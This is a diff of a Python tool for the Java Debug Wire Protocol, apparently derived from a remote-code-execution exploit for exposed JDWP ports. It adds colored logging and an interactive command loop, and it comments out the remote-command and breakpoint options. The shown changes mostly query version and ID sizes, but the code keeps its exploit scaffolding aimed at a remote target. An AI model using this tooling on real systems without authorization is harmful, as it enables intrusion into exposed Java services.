@@ -13,7 +13,8 @@ import socket
 import time
 import sys
 import struct
-import urllib
+import logging 
+import colorlog
 import argparse
 import traceback
 
@@ -76,12 +77,21 @@ TYPE_CLASS                = 1
 #
 class JDWPClient:
 
-    def __init__(self, host, port=8000):
+    def __init__(self, host, port=8000, loggerlevel = 'INFO'):
         self.host = host
         self.port = port
         self.methods = {}
         self.fields = {}
         self.id = 0x01
+        self.logger = logging.getLogger()
+        console_handler = logging.StreamHandler()
+        formatter = colorlog.ColoredFormatter(
+            '%(log_color)s[%(asctime)s] [%(filename)s:%(lineno)d] [%(module)s:%(funcName)s] [%(levelname)s]- %(message)s',
+            log_colors= { 'DEBUG': 'green', 'INFO': 'white', 'WARNING': 'yellow', 'ERROR': 'red', 'CRITICAL': 'red', }
+        )
+        console_handler.setFormatter(formatter)
+        self.logger.setLevel(loggerlevel.upper())
+        self.logger.addHandler(console_handler)
         return
 
     def create_packet(self, cmdsig, data=""):
@@ -99,7 +109,6 @@ class JDWPClient:
                          bytes( chr(cmd), encoding = "utf-8")
                           )
         pkt+= bytes(data, encoding = "utf-8")
-        print("发送命令包: %s" % pkt)
         self.id += 2
         return pkt
 
@@ -132,8 +141,6 @@ class JDWPClient:
         else:
             nb_entries = 1
         
-        print("解析回应对象，一共 %s 个对象 : " % nb_entries)
-
         for i in range(nb_entries):
             data = {}
             for fmt, name in formats:
@@ -164,7 +171,6 @@ class JDWPClient:
                 else:
                     print("Error")
                     sys.exit(1)
-            print(data)
             entries.append( data )
 
         return entries
@@ -198,7 +204,7 @@ class JDWPClient:
         return
 
     def handshake(self, host, port):
-        print("握手")
+        self.logger.debug("握手")
         s = socket.socket()
         try:
             s.connect( (host, port) )
@@ -220,7 +226,6 @@ class JDWPClient:
         return
 
     def getversion(self):
-        print("version")
         self.socket.sendall( self.create_packet(VERSION_SIG) )
         buf = self.read_reply()
         formats = [ ('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
@@ -236,7 +241,7 @@ class JDWPClient:
 
     # 返回vm各种类型的占位大小: 
     def idsizes(self):
-        print("idsizes")
+        self.logger.debug("idsizes")
         self.socket.sendall( self.create_packet(IDSIZES_SIG) )
         buf = self.read_reply()
         formats = [ ("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
@@ -272,7 +277,7 @@ class JDWPClient:
             getattr(self, "classes")
         except:
             # 获取所有被vm加载的类
-            print("获取所有类")
+            self.logger.debug("allclasses")
             self.socket.sendall( self.create_packet(ALLCLASSES_SIG) )
             buf = self.read_reply()
             formats = [ ('C', "refTypeTag"),
@@ -442,6 +447,22 @@ class JDWPClient:
         loc = -1 # don't care
         return rId, tId, loc
 
+    def runtime_exec(self, command) : 
+        if command == 'version': 
+            sig = VERSION_SIG
+            formats = [ ('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
+                        ('S', "vmVersion"), ('S', "vmName"), ]
+        if command == 'idsizes': 
+            sig = IDSIZES_SIG
+            formats = [ ("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
+                    ("I", "referenceTypeIDSize"), ("I", "frameIDSize") ]
+
+        self.socket.sendall( self.create_packet(sig) )
+        buf = self.read_reply()
+        for entry in self.parse_entries(buf, formats, False):
+            for name,value  in entry.items():
+                print ( " %s : %s " % (name,  value))
+        return
 
 
 def runtime_exec(jdwp, args):
@@ -645,29 +666,34 @@ if __name__ == "__main__":
 
     parser.add_argument("-t", "--target", type=str, metavar="IP", help="Remote target IP", required=True) # ip
     parser.add_argument("-p", "--port", type=int, metavar="PORT", default=8000, help="Remote target port") # 端口
+    parser.add_argument("-l", "--loglevel", type=str, metavar="LogLevel", default='INFO', help="log level") # 日志级别
 
-    parser.add_argument("--break-on", dest="break_on", type=str, metavar="JAVA_METHOD",         # 断点
-                        default="java.net.ServerSocket.accept", help="Specify full path to method to break on")
-    parser.add_argument("--cmd", dest="cmd", type=str, metavar="COMMAND", # 命令
-                        help="Specify command to execute remotely")
+    # 断点解析成类名和方法名 del by eric_zyh 2022/09/16 改为交互式
+    # parser.add_argument("--break-on", dest="break_on", type=str, metavar="JAVA_METHOD",         # 断点
+    #                    default="java.net.ServerSocket.accept", help="Specify full path to method to break on")
+    # parser.add_argument("--cmd", dest="cmd", type=str, metavar="COMMAND", # 命令
+    #                    help="Specify command to execute remotely")
+    # classname, meth = str2fqclass(args.break_on)
+    # setattr(args, "break_on_class", classname)
+    # setattr(args, "break_on_method", meth)
 
     args = parser.parse_args()
-
-    # 断点解析成类名和方法名
-    classname, meth = str2fqclass(args.break_on)
-    setattr(args, "break_on_class", classname)
-    setattr(args, "break_on_method", meth)
 
     retcode = 0
 
     try:
-        cli = JDWPClient(args.target, args.port)
+        cli = JDWPClient(args.target, args.port, args.loglevel)
         # 启动
         cli.start()
 
-        if runtime_exec(cli, args) == False:
-            print ("[-] Exploit failed")
-            retcode = 1
+        while (True) :
+            command = input("Enter your cmd (Use 'exit' to exit) : ")
+            if (command == 'exit') :
+                print('bye!')
+                retcode = 1
+                break
+            if cli.runtime_exec(command) == False:
+                print ("[-] Exploit failed")
 
     except KeyboardInterrupt:
         print ("[+] Exiting on user's request")
